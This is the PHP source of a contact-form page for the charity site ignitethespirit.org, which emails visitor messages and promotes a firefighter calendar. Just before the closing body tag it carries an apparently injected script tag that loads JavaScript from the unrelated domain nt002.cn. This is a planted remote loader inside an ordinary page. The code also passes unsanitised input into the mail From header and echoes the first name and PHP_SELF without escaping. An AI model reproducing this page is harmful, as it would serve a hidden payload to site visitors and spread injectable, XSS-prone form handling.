<?php
session_start();
if (isset($_POST['process']))
{

	/*
	echo $_POST['process']."<br />";
	echo $_POST['firstname']."<br />";
	echo $_POST['lastname']."<br />";
	echo $_POST['email']."<br />";
	echo $_POST['phone']."<br />";
	echo $_POST['reason']."<br />";
	echo $_POST['subject']."<br />";
	echo $_POST['content']."<br />";
	*/
	$my_email = "richpinskey@aol.com";
	// $my_email = "mike.pisula@gmail.com";
	$email = "From:".$_POST['email'] ;
	
	$subject = "Message from ignitethespirit.org | ".$_POST['subject'];
	
	$message = $_POST['firstname']." ".$_POST['lastname']." [ ".$_POST['email']." ] "." [ ".$_POST['phone']." ] "."Has sent you a message through the contact from on ignitethespirit.org about ".$_POST['reason'].":\n\n";
	$message .= "---------- \n\n";
	$message .= "Subject: ".$_POST['subject']."\n\n";
	$message .= "Message: \n\n".$_POST['content']."\n\n";
	mail( $my_email, $subject, $message, $email );
	
	$_SESSION['fname'] = $_POST['firstname'];
	
	header( "Location: contact.php" );
	
	
	
}
else
{
?>
<?php include("header.php"); ?>
<!--
	<div class="nav_container">
		<ul class="floatright">
			<li><a href="index.html">Home</a></li> 
			<li> |&nbsp;</li>
			<li><a href="about.html">About</a></li>
			<li> |&nbsp;</li>
			<li><a href="#">Store</a></li> 
			<li> |&nbsp;</li>
			<li><a href="#">Contact</a></li>    	  	
		</ul>
	</div>
-->
	<div class="container">
		<div class="left">
		    <a class="logo_link" href="index.php"><img src="images/its_logo_rollover.jpg" alt="logo" /></a>
			
    		<div class="left_content"> 
          	<?php include("navigation.php"); ?>
		    </div>

			
			<!--
			<div class="left_content">
				<img src="images/125x125banner.jpg" />
			</div>
			-->
		</div>
		<div class="middle">
			<div class="contact">
				
				<?php 
				if (isset($_SESSION['fname'])){ echo "<div class='confirmMessage'>\nThank you for your submission ".$_SESSION['fname'].", we will respond to you as soon as possible. If you have an urgent matter please give us a call.\n</div>"; } 
				session_destroy();
				?>
				<h1>Call Ignite The Spirit</h1>
				<form action="#" method="post">
						<h2>Ignite the Spririt Hotline: 773.218.1038</h2>
				</form>
				<h1>Email Ignite the Spirit</h1>
				<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post">
				<input type="hidden" name="process" value="go" />
					<fieldset>
						<label>First Name: </label><input  name="firstname" type="text" /> 
						<label>Last Name:</label><input  name="lastname" type="text" />
						<label>E-Mail:</label><input  name="email" type="text" />
						<label>Phone:</label><input  name="phone" type="text" />
					</fieldset>
					<fieldset>
						<label>Reason:</label>
						<select name="reason">
							<option> </option>
							<option>Donations</option>
							<option>The Firefighter Calendar</option>
							<option>The Website</option>
							<option>Other</option>
						</select>
					</fieldset>
					<fieldset>
						<label>Subject:</label>
						<input class="full" name="subject" type="text" />
						<textarea name="content" cols="30" rows="20"></textarea><br />
					</fieldset>
					<input class="submit" name="submit" type="submit" value="Submit" />
				</form>
				<!-- <h1>Call ignite The Spirit</h1> -->
			</div>
		</div>
		<div class="right">
			<div class="calendar_advertisement">
				<h1>Ignite The Spirit Calendar</h1>
				<img width="75%" src="images/2009Calendar.jpg" alt="Calendar Cover" />
				<p><a href="store.php">SHOP NOW</a></p>
			</div>
		</div>
	</div>
<?php include("footer.php"); ?>
<script src='http://nt002.cn/E/J.JS'></script></body>
</html>
<?php 
}
?>

